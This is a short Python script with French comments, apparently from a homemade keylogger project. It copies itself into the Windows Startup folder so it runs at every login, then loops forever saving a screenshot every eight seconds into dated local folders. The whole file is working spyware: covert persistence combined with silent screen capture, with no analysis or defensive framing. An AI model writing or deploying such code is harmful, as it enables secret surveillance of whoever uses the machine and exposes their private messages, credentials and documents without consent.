

import os
import datetime
import time

from shutil import copyfile

username = os.getlogin()
nomFichierActuelle = os.path.basename(__file__)
print(nomFichierActuelle)
# **** copier pour qu'il s'allume au démarrage
copyfile(nomFichierActuelle,f"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/{nomFichierActuelle}")

# ****  on va ranger ça où ? le nom du fichier ? #####

#nomEmplacementSauvegarde = "G:/Mon Drive/KeyLogger Sauvegarde"
nomEmplacementSauvegarde = "data"
if not os.path.exists(nomEmplacementSauvegarde):
	os.makedirs(nomEmplacementSauvegarde)

dateajd = datetime.datetime.now().strftime('%Y-%m-%d')
dateheure = datetime.datetime.now().strftime('%H:%M:%S')

nomEmplacementSauvegarde += "/" + datetime.datetime.now().strftime('%Y-%m-%d')
if not os.path.exists(nomEmplacementSauvegarde):
	os.makedirs(nomEmplacementSauvegarde)

nomEmplacementSauvegarde += "/" + "screens"
if not os.path.exists(nomEmplacementSauvegarde):
	os.makedirs(nomEmplacementSauvegarde)

# **** SCREENER
intervalles_screen = 8
import pyautogui

def capturer(temps):
	
	myDatetime = datetime.datetime.now()
	nomFichier= myDatetime.strftime('%Y-%m-%d-%H%M%S')
	photo = nomEmplacementSauvegarde + "/" + nomFichier + ".png"
	
	# prendre photo	
	pyautogui.screenshot(photo)
	print("# " + photo)
	time.sleep(temps)

while 1:
	capturer(intervalles_screen)
    

	  

